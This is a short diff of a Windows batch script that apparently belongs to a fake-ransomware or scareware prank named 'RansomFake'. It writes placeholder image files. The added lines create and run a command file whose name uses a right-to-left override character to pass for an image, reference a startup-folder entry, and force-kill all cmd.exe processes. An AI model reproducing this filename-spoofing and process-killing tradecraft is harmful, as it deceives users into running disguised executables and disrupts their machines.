@@ -102,6 +102,8 @@ echo "(random data 50)" > 3a4b5c6d.png
 echo "(random data 51)" > 9f8e7d6c.jpg
 echo "(random data 52)" > 4d5e6f7a.gif
 echo "(random data 53)" > 5c46eio7t7.png
-echo "del shell:startup\RansomFake.cmd" >592e82u‮.gpj.cmd
+echo "del shell:startup\RansomFake.cmd" > 592e82‮.gpj.cmd
+"592e82‮.gpj.cmd"
 taskkill /f /im "cmd.exe"
+
 
